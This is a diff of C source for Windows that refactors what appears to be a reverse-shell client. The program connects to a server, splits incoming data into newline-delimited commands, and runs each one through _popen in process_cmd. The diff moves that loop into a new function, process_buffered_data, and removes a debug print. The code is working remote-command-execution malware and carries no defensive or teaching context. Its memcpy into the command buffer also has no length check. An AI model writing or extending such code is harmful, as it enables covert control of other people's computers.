@@ -38,6 +38,32 @@ SOCKET connect_to_server() {
   
 }
 
+int process_buffered_data(int *recv_len, char *recv_buffer, char *cmd, SOCKET sock) {
+
+  char *newline;
+  while ((newline = memchr(recv_buffer, '\n', *recv_len)) != NULL) {
+    int cmd_len = newline - recv_buffer;
+
+    // Copy bytes up to \n delimiter from recv_buffer into cmd buffer
+    memcpy(cmd, recv_buffer, cmd_len);
+    // Append `\0` to make it a string
+    cmd[cmd_len] = '\0';
+
+    // Move remaining bytes back to the start of recv_buffer
+    memmove(recv_buffer, recv_buffer + cmd_len + 1, *recv_len - (cmd_len + 1));
+    *recv_len = *recv_len - (cmd_len + 1);
+          
+    // Perform received command
+    if (process_cmd(cmd, sock) < 0) {
+      return -1;
+    }
+
+  }
+
+  return 0;
+
+}
+
 int process_cmd(char *cmd, SOCKET sock) {
 
   FILE *fp = _popen(cmd, "r");
@@ -105,30 +131,9 @@ int main() {
       if (n > 0) {
 
         recv_len += n;
-        char *newline;
-
-        while ((newline = memchr(recv_buffer, '\n', recv_len)) != NULL) {
-          int cmd_len = newline - recv_buffer;
-
-          // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
-          memcpy(cmd, recv_buffer, cmd_len);
-          // Append `\0` to make it a string
-          cmd[cmd_len] = '\0';
-
-          printf("Received from server: %s", cmd);
-
-          // Move remaining bytes back to the start of recv_buffer
-          memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - (cmd_len + 1));
-          recv_len = recv_len - (cmd_len + 1);
-          
-
-
-          // Perform received command
-          if (process_cmd(cmd, sock) < 0) {
-            closesocket(sock);
-            connection_alive = 0;
-          }
-
+        if (process_buffered_data(&recv_len, recv_buffer, cmd, sock) < 0) {
+          closesocket(sock);
+          connection_alive = 0;
         }
 
       } else {
